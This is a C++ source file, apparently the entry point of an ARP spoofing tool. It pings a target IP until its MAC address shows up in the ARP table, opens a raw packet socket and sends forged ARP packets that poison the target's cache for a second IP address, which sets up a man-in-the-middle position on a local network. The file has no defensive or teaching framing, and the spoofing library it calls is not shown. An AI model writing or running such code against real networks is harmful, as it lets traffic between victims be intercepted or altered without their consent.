#include <linux/if_arp.h>
#include <netinet/ip_icmp.h>
#include <thread>
#include <cstring>
#include <arpa/inet.h>
#include <iostream>
#include <sys/ioctl.h>

#include "libs/socket.h"
#include "libs/arp_spoof.h"
#include "libs/ping.h"
#include "libs/settings.h"
#include "utils/arp_table.h"

int main(int argc, char *argv[]) {
  setSettings("./settings.txt");

  std::string targetMacAddressA = "";
  while(true) {
    std::string macAddress = getMacAddressByIPFromARPTable(getSettings().targetIPAddressA);
    if(macAddress == "") {
      std::cout << "MAC Address is Null" << std::endl;
      Socket *socketForPing = new Socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
      sockaddr_in pingDestAddress;
      setInternetSocketAddress(&pingDestAddress, getSettings().targetIPAddressA.c_str(), 0);
      ping(socketForPing, &pingDestAddress);
    } else {
      targetMacAddressA = macAddress;
      std::cout << targetMacAddressA << std::endl;
      break;
    }
  }

  Socket *socketForSpoofA = new Socket(AF_PACKET, SOCK_RAW, ETH_P_ARP);
  sockaddr_ll targetSocketAddressA;
  setLowLevelSocketAddress(
    &targetSocketAddressA,
    htons(ETH_P_ARP),
    socketForSpoofA->getFileDescriptor(),
    getSettings().interfaceName.c_str(),
    htons(ARPHRD_ETHER),
    PACKET_BROADCAST,
    targetMacAddressA.c_str()
  );

  unsigned char addressAChar[IPV4_LENGTH];
  inet_pton(AF_INET, getSettings().targetIPAddressA.c_str(), addressAChar);

  unsigned char addressBChar[IPV4_LENGTH];
  inet_pton(AF_INET, getSettings().targetIPAddressB.c_str(), addressBChar);

  ARPSpoof *arpSpoofA = new ARPSpoof(socketForSpoofA, targetSocketAddressA.sll_addr, addressAChar, addressBChar);
  arpSpoofA->spoof(&targetSocketAddressA,1);

  delete arpSpoofA;
  delete socketForSpoofA;

  return 0;
}